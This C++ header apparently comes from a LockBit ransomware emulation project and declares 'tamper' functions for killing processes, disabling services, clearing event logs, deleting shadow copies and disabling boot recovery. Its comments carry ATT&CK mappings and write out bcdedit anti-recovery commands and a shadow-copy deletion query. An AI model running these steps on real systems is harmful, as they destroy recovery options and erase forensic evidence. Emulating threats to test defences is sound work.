#pragma once

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <set>
#include <string>
#include <vector>
#include <Windows.h>
#include <winsvc.h>
#include <winevt.h>
#include <combaseapi.h>
#include <Objbase.h>
#include <Wbemidl.h>
#include <wbemcli.h>
#include <processthreadsapi.h>
#include <tlhelp32.h>
#include "util/winapihelper.hpp"

// Service API definitions
using FP_CloseServiceHandle = decltype(&CloseServiceHandle);
using FP_ControlService = decltype(&ControlService);
using FP_EnumDependentServicesW = decltype(&EnumDependentServicesW);
using FP_OpenSCManagerW = decltype(&OpenSCManagerW);
using FP_OpenServiceW = decltype(&OpenServiceW);
using FP_QueryServiceStatusEx = decltype(&QueryServiceStatusEx);
using FP_ChangeServiceConfigW = decltype(&ChangeServiceConfigW);

// COM API definitions
using FP_CoInitializeEx = decltype(&CoInitializeEx);
using FP_CoInitializeSecurity = decltype(&CoInitializeSecurity);
using FP_CoCreateInstance = decltype(&CoCreateInstance);
using FP_CoSetProxyBlanket = decltype(&CoSetProxyBlanket);
using FP_CoUninitialize = decltype(&CoUninitialize);

// wevt API definitions
using FP_EvtClose = decltype(&EvtClose);
using FP_EvtClearLog = decltype(&EvtClearLog);
using FP_EvtOpenChannelEnum = decltype(&EvtOpenChannelEnum);
using FP_EvtNextChannelPath = decltype(&EvtNextChannelPath);
using FP_EvtOpenChannelConfig = decltype(&EvtOpenChannelConfig);
using FP_EvtSaveChannelConfig = decltype(&EvtSaveChannelConfig);
using FP_EvtSetChannelConfigProperty = decltype(&EvtSetChannelConfigProperty);

// Process API definitions
using FP_OpenProcess = decltype(&OpenProcess);
using FP_CreateToolhelp32Snapshot = decltype(&CreateToolhelp32Snapshot);
using FP_Process32FirstW = decltype(&Process32FirstW);
using FP_Process32NextW = decltype(&Process32NextW);

namespace tamper {

/*
 * KillProcesses (defined in src/lockbit_main/tamper/proc.cpp):
 *      About:
 *          Enumerates processes on the local system and terminates any that are included in the
 *          process_names vector. 
 *          Relevant API calls:
 *              CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, 
 *              OpenProcess, TerminateProcess
 *      Result:
 *          Terminated processes
 *      MITRE ATT&CK Techniques:
 *          T1489: Service Stop
 *          T1057: Process Discovery
 *          T1106: Native API
 *      CTI:
 *          https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a
 *          https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165
 *          https://www.cybereason.com/hubfs/dam/collateral/reports/Threat-Analysis-Assemble-LockBit-3.pdf
 *      Other References:
 *          https://learn.microsoft.com/en-us/windows/win32/toolhelp/taking-a-snapshot-and-viewing-processes
 */
void KillProcesses(const std::set<unsigned long>& hashed_process_names);

/*
 * TerminateAndDisableServices (defined in src/lockbit_main/tamper/svc.cpp):
 *      About:
 *          Attempts to stop and disable each service in the provided list of targets. If the service has dependent
 *          services, those services will also be stopped first, but not disabled. Requires elevated privileges.
 *          Relevant API calls:
 *              OpenSCManagerW, OpenServiceW, ControlService, QueryServiceStatusEx, 
 *              EnumDependentServicesW, ChangeServiceConfigW
 *      Result:
 *          Stopped and disabled services.
 *      MITRE ATT&CK Techniques:
 *          T1489: Service Stop
 *          T1106: Native API
 *      CTI:
 *          https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a
 *          https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a
 *          https://www.cybereason.com/hubfs/dam/collateral/reports/Threat-Analysis-Assemble-LockBit-3.pdf
 */
bool TerminateAndDisableServices(const std::vector<std::wstring>& svc_names);

/*
 * ClearAndDisableEventLogs (defined in src/lockbit_main/tamper/event_log.cpp):
 *      About:
 *          Attempts to clear and disable each available event log channel.
 *          Relevant API calls:
 *              EvtOpenChannelEnum, EvtNextChannelPath, EvtClearLog, EvtOpenChannelConfig,
 *              EvtSetChannelConfigProperty, EvtSaveChannelConfig
 *      Result:
 *          Cleared and disabled Windows event log channels
 *      MITRE ATT&CK Techniques:
 *          T1070.001: Indicator Removal: Clear Windows Event Logs
 *          T1106: Native API
 *      CTI:
 *          https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a
 *          https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a
 */
void ClearAndDisableEventLogs();

/*
 * DeleteShadowCopies (defined in src/lockbit_main/tamper/shadow.cpp):
 *      About:
 *          Performs WMI query "SELECT * FROM Win32_ShadowCopy" against the root/cimv2 namespace
 *          and deletes any discovered shadow copies. Shadow copy deletion is performed using the
 *          "Win32_ShadowCopy.ID='<discovered ID>'" filter for each discovered shadow copy ID.
 *          Key API calls for the WMI query and shadow copy deletion are as follows: CoInitializeEx, 
 *          IWbemLocator::ConnectServer, IWbemServices::ExecQuery, IWbemServices::DeleteInstance.
 *      Result:
 *          Deleted shadow copies
 *      MITRE ATT&CK Techniques:
 *          T1490: Inhibit System Recovery
 *          T1047: Windows Management Instrumentation
 *          T1106: Native API
 *      CTI:
 *          https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a
 *          https://www.cybereason.com/hubfs/dam/collateral/reports/Threat-Analysis-Assemble-LockBit-3.pdf
 *          https://www.trendmicro.com/en_za/research/22/g/lockbit-ransomware-group-augments-its-latest-variant--lockbit-3-.html
 */
void DeleteShadowCopies();

/*
 * DisableBootRecovery (defined in src/lockbit_main/tamper/boot_recovery.cpp):
 *      About:
 *          Uses the bcdedit.exe executable to disable automatic Windows recovery features
 *          by setting the boot loader display to ignore all boot failures and by disabling automatic repair at boot.
 *          The child processes and arguments are as follows:
 *              bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures
 *              bcdedit.exe /set {default} recoveryenabled no
 *          Process execution leverages the CreateProcessW API call.
 *      Result:
 *          Two bcdedit.exe processes that set the boot loader display to ignore all boot failures and
 *          disable automatic repair at boot.
 *      MITRE ATT&CK Techniques:
 *          T1490: Inhibit System Recovery
 *      CTI:
 *          https://www.cybereason.com/blog/threat-analysis-report-lockbit-2.0-all-paths-lead-to-ransom
 *          https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/lockbit-targets-servers
 */
void DisableBootRecovery();

} // namespace